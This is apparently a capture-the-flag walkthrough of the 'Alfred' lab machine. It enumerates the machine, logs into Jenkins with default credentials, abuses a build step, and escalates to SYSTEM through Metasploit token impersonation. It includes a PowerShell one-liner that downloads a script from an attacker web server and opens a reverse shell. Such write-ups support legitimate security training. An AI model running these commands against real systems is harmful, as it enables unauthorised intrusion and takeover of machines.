# Enumeration

We start by using autorecon to quickly enumerate the ports and services.
`autorecon 10.10.113.61`
![dd9a13071c8461374b509e37a2a4db10.png](/Alfred/_resources/dd9a13071c8461374b509e37a2a4db10-1.png)

For more details, we can either check the logs given by the autorecon output, or we can run nmap:
`nmap -T5 -sC -A --osscan-guess --version-all -Pn -p 80,3389,8080 10.10.113.61`
![d2a50d4cf74f5a244a7680b0df2a2150.png](/Alfred/_resources/d2a50d4cf74f5a244a7680b0df2a2150-1.png)

We find http running on port 80. Going to http://10.10.113.61 gives us:

![267168277d1f6e20a4463412e48bd9ae.png](/Alfred/_resources/267168277d1f6e20a4463412e48bd9ae-1.png)

Nothing notable appears in the page source. Navigating instead to 10.10.113.61:8080 gives a Jenkins login page:
 

![783d158db4d546b2ab0ee049ae1b578c.png](/Alfred/_resources/783d158db4d546b2ab0ee049ae1b578c-1.png)
 

Once again, the page source doesn't reveal much. Trying the default credentials admin:admin gets us into the Jenkins dashboard:
 

![a527de0ee349e6fcddcbed81db4914a8.png](/Alfred/_resources/a527de0ee349e6fcddcbed81db4914a8-1.png)
 

We're looking for a feature which allows us execute commands on the underlying system. At the bottom of the webpage, we see an active build named "project":
 

![099c38f39b1e062b9fc7d6a99fdb0aca.png](/Alfred/_resources/099c38f39b1e062b9fc7d6a99fdb0aca-1.png)
 

Navigating to the configuration settings for this project, we find the following relevant build step:
 

![df922b933258d49ab554fed97c44158e.png](/Alfred/_resources/df922b933258d49ab554fed97c44158e-1.png)
 

This looks promising! Notice that `whoami` is the default command listed here. We can verify that this works by navigating to the project homepage, clicking on "Build Now", and then viewing the console output for build #2:
 

![797385c50a81e61038bb31d4f5b2e491.png](/Alfred/_resources/797385c50a81e61038bb31d4f5b2e491-1.png)

![e97e8388278e65592a74888c08abfb87.png](/Alfred/_resources/e97e8388278e65592a74888c08abfb87-1.png)
 

<br>

# Exploitation

We will make use of the [reverse shell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) provided in the exercise. We first set up a web server on port 9999:
 

![d135c1b5422b75eb6d5b67c8c0f4a092.png](/Alfred/_resources/d135c1b5422b75eb6d5b67c8c0f4a092-1.png)
 

Set up a netcat listener on a different port with ``nc -lvnp 8888`` then execute the following command

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP:9999/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress LOCAL_IP -Port 8888
```

using the feature we found in the enumeration phase. Our netcat listener will catch the reverse shell, giving us initial access to the machine.
 

![1572bfd20feeccdf3a2075f2160176fe.png](/Alfred/_resources/1572bfd20feeccdf3a2075f2160176fe-1.png)
 

Digging around, we eventually find the user.txt file in ``C:\Users\bruce\Desktop``.
 

![9ca6197a960a87ec9973d760e8b3c825.png](/Alfred/_resources/9ca6197a960a87ec9973d760e8b3c825-1.png)
 

Using ``type user.txt`` gives us our flag.

As part of Task 2, we are asked to switch to a meterpreter shell in order to facilitate easier privilege escalation. We generate an x86-64 reverse shell using msfvenom:
 

![00cf123b41d92301f44b5cc4ab6244ba.png](/Alfred/_resources/00cf123b41d92301f44b5cc4ab6244ba-1.png)
 

Note that this gives us the answer to the only question in Task 2. We download the .exe file on the target machine using the same technique used in Task 1. Now set up a handler in Metasploit with ``use exploit/multi/handler`` with the following options:
 

![e18242f0bff037e0f026b24a82b01662.png](/Alfred/_resources/e18242f0bff037e0f026b24a82b01662-1.png)
 

Now ``run``  to start the reverse TCP handler. On our target machine, we navigate to the directory containing our msfvenom payload and execute  ``Start-Process task2shell.exe`` . This gives us a meterpreter session:
 

![aeab9f9383a0bda9bdecac00b6f03c87.png](/Alfred/_resources/aeab9f9383a0bda9bdecac00b6f03c87-1.png)
 

(Note: The target IP is a bit different here, as I had to reset the machine.)

<br>

# Post-exploitation

With our upgraded meterpreter shell, we can now try to escalate privileges. The main technique used here is that of [token impersonation](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). Start by using ``shell powershell`` within our meterpreter shell. Running ``whoami /priv`` gives us a list of privileges and their states:
 

![8c6e13bcd9ca329caaf95caf839ca559.png](/Alfred/_resources/8c6e13bcd9ca329caaf95caf839ca559-1.png)
 

Note that a few privileges are enabled. Exit out to meterpreter and use the incognito module, then use ``list_tokens -g`` to list all available delegation and impersonation tokens.
 

![d7e82c70ea426de69a6169973870ebb6.png](/Alfred/_resources/d7e82c70ea426de69a6169973870ebb6-1.png)
 

Since the BUILTIN\Administrators token is available, we can impersonate it:
 

![7f63634cce1c105e8dcc5fe64050eb8a.png](/Alfred/_resources/7f63634cce1c105e8dcc5fe64050eb8a-1.png)
 

Using ``getuid`` confirms that we have successfully impersonated the above user, which answers the third question of Task 3. Next, we want to migrate to a process with the correct permissions. Using ``ps`` gives us some possibilities:
 

![87307fc3f9141c3f191b71b29ed05ae4.png](/Alfred/_resources/87307fc3f9141c3f191b71b29ed05ae4-1.png)
 

Migrate to the services.exe process using `migrate 668`. This gives us the correct permissions. We can now `cd` into the config directory and `cat root.txt` to get the final flag. Alternatively, we can drop into a shell and `type root.txt`.
 

![8cc2de1e9c169473bb79a83fc6ca9c81.png](/Alfred/_resources/8cc2de1e9c169473bb79a83fc6ca9c81-1.png)
 
